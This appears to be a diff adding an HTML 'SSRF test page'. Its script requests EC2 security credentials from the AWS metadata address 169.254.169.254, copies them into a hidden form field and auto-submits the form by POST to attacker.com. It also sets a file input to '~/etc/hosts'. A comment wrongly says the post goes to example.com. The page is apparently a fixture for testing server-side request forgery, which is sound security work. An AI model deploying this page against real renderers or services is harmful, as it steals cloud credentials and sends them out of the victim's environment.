@@ -1,0 +1,38 @@
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <title>This is Page 1</title>
+</head>
+<body>
+
+<h1> This is a SSRF test page! </h1>
+
+<!-- will send POST request to example.com -->
+<form id="pwn-form" enctype="multipart/form-data" method="POST" action="http://attacker.com">
+    <input type="hidden" id="name" name='n' value='Some Value'/>
+
+    <input type="file" name="myFile" id="myFile" value="~/etc/hosts">
+
+
+</form>
+</body>
+<script>
+    $.ajax({
+        url: 'http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance',
+        data: {
+            format: 'json'
+        },
+        error: function () {
+            $('#info').html('<p>An error has occurred</p>');
+        },
+        dataType: 'jsonp',
+        success: function (data) {
+            document.getElementById('name').value = JSON.stringify(data);
+        },
+        type: 'GET'
+    });
+
+    var form = document.getElementById("pwn-form");
+    form.submit();
+</script>
+
+</body>
